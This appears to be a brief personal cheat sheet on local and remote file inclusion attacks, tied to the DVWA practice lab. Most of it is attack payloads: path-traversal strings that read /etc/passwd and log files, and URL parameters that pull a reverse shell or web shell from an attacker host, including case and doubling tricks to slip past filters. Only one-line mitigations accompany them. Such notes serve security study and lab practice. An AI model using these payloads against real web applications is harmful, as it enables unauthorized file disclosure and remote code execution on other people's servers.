# File Inclusion

## Local
- Exploit
  - ```example1.php?page=intro.php../../../../../etc/passwd```
  - ```example2.php?page=intro../../../../../../../../../../etc/passwd%00``` 

- Intersting files
  - ```/proc/self/environ```
  - ```/var/log/auth.log```
  - ```/var/log/apache2/access.log```
  
- Mitigation
  - Use static file inclusion. hard code the fiels that we want to include in the code.

## Remote
- Exploit
  - ```http://127.0.0.1/vulnerabilities/fi/?page=http://192.168.72.200:9999/php-reverse-shell.php```
  - ```index.php?page=http://attackerIP/webshell.php``` 
  - ```index.php?page=htthttpp://attackerIP/webshell.php```
  - ```?page=hTTp://10.20.14.203/reverse.txt?```

- Mitigation
  -  Disable ```allow_url_fopen = On``` & ```allow_url_include = On```

## Example
  - [DVWA](../BuggyApp/DVWA/file-inclusion.md)  
